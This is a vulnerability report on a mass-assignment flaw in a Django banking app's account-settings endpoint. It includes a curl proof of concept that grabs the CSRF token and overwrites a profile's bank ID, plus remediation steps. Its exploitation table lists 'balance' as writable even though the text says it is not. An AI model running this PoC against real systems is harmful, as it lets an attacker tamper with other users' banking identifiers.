# Description

Mass assignment (CWE-915) in the profile-update flow `POST /account/settings/` (`Account/views.py:452-457`). The `new_username` branch of `settings()` iterates over **every** key in `request.POST` and calls `setattr(profile, key, value)` for any key matching a `UserProfile` field (only `csrfmiddlewaretoken` is excluded). An authenticated user can write any `UserProfile` column by adding it as a POST field — including the **bank ID (`bid`)** used to receive transfers.

Note: `is_staff`, `is_superuser`, and `balance` are **not** `UserProfile` fields (they belong to the `User` model or the banking backend), so admin/privilege escalation via this vector is not possible. The impact is limited to `UserProfile` attributes such as `bid`, `biography`, `picture_path`, and other profile-level fields.
The `bid` field is subject to a database-level uniqueness constraint, confirmed through Django database introspection. The financial impact described in the original report has not been independently demonstrated.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Authenticate as a normal user. | Valid session. |
| 2 | POST the settings form with extra fields (e.g. `bid`, `role`, `balance`). | The values are written straight to the profile. |
| 3 | Read the profile back. | Attacker-controlled fields persisted. |

# PoC

```bash
CSRF=$(curl -sc jar.txt http://<TARGET>/account/settings/ | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')
curl -sb jar.txt -c jar.txt -X POST http://<TARGET>/account/settings/ \
  --data-urlencode "csrfmiddlewaretoken=${CSRF}" \
  --data-urlencode "new_username=attacker01" \
  --data-urlencode "bid=<victim_bank_id>"
# the setattr loop writes `bid` (and any other UserProfile field) verbatim
```

The reported behaviour concerns unauthorised modification of profile attributes. The database-level uniqueness constraint on `bid` has been confirmed. Financial redirection and successful modification of an already assigned banking identifier have not been demonstrated.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | No direct confidentiality impact demonstrated. |
| Integrity | Unauthorised modification of profile attributes. The reported financial impact has not been demonstrated. |
| Availability | No direct availability impact demonstrated. |

Overall severity: **High** — improper control over profile attribute modification. The original severity assessment is retained, although the reported financial impact has not been independently demonstrated.

# Remediation

1. **Allow-list editable fields explicitly** and validate profile updates using a dedicated form or schema.
2. Protect identity-bearing and security-sensitive fields by excluding them from generic profile-update operations.
3. **Separate sensitive fields** behind their own audited, authorised flows.
4. **Add regression tests** to ensure that unauthorised profile modifications are rejected and model integrity constraints are preserved.

# Author
CPE LYON
